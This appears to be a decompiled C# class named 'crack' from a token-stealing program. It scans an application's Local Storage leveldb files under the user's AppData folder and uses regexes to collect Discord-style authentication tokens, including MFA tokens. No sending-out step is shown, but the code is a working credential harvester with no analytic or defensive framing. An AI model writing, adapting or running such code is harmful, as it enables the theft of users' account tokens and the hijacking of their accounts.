using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace X
{
	// Token: 0x0200004A RID: 74
	public static class crack
	{
		// Token: 0x1700004C RID: 76
		// (get) Token: 0x060001FF RID: 511 RVA: 0x00002D18 File Offset: 0x00000F18
		// (set) Token: 0x06000200 RID: 512 RVA: 0x00002D1F File Offset: 0x00000F1F
		public static bool TokensFound { get; private set; }

		// Token: 0x06000201 RID: 513 RVA: 0x00010FC0 File Offset: 0x0000F1C0
		public static List<string> GetTokens(string dir, bool checkLogs = false)
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\" + dir + "\\Local Storage\\leveldb");
			List<string> list = new List<string>();
			try
			{
				FileInfo[] files = directoryInfo.GetFiles(checkLogs ? "*.log" : "*.ldb");
				for (int i = 0; i < files.Length; i++)
				{
					string input = files[i].OpenText().ReadToEnd();
					foreach (object obj in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
					{
						Match match = (Match)obj;
						list.Add(match.Value);
					}
					foreach (object obj2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
					{
						Match match2 = (Match)obj2;
						list.Add(match2.Value);
					}
				}
			}
			catch
			{
			}
			list = list.Distinct<string>().ToList<string>();
			if (list.Count > 0)
			{
				crack.TokensFound = true;
				List<string> list2 = list;
				int i = list.Count - 1;
				list2[i] += " /SUCESS";
			}
			return list;
		}
	}
}
